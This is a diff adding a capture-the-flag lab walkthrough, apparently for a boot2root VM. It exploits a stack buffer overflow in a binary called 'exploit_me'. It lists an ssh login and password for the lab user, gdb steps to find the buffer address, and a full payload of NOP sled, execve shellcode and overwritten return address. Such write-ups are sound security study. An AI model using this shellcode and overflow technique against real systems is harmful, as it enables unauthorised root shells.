@@ -1,0 +1,44 @@
+------------------------------
+        RETURN 2 BUFFER
+------------------------------
+
+********************************************************************
+ZAZ'S' PART
+********************************************************************
+
+We connect to zaz's' user with ssh
+    - ssh zaz@192.168.56.107
+    password : 646da671ca01bb5d84dbb5fb2238dc8e
+
+
+We need to find the adress of dest
+Hex ray tell us that : 
+        char dest[128]; // [esp+10h] [ebp-80h] BYREF  0xffffceb2 0xffffcef8
+
+gdb ./exploit_me
+disas main : we see 0x08048419 <+37>:	lea    0x10(%esp),%eax
+b *0x08048419
+run
+p $esp-16 : $1 = (void *) 0xbffff6b0
+
+
+With some test we found the offset : buffer[128] + 12 (offset) + 4 bytes (EIP)
+
+Now we can store our shell code : 
+    \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+And overwrite the eip with : \xb0\xf6\xff\xbf
+
+So the payload final will be :
+    ./exploit_me `python -c 'print("\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 19 + "\xb0\xf6\xff\xbf")'`
+    
+
+
+
+
+
+
+
+
+
+
+
